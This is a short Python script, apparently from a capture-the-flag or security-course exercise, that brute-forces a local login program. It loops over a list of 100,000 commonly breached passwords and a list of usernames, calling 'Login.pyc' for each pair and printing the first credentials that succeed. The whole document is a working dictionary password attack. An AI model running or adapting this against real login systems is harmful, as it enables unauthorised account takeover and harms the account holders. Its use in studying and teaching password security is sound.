import subprocess

with open('gang', 'r') as file:
    gang_members = file.read().splitlines() 

with open('PwnedPWs100k', 'r') as file:
    # Read the lines from the file and store them in a list
    common_passwords = file.read().splitlines() 

gang_members.remove('Adam')

flag = 0
for password in common_passwords:
    for member in gang_members:
        result = subprocess.run(['python3', 'Login.pyc', member, password], capture_output=True, text=True, check=True)
        if ('successful' in result.stdout):
            print(member, password)
            flag = 1
            break
    if(flag == 1):
        break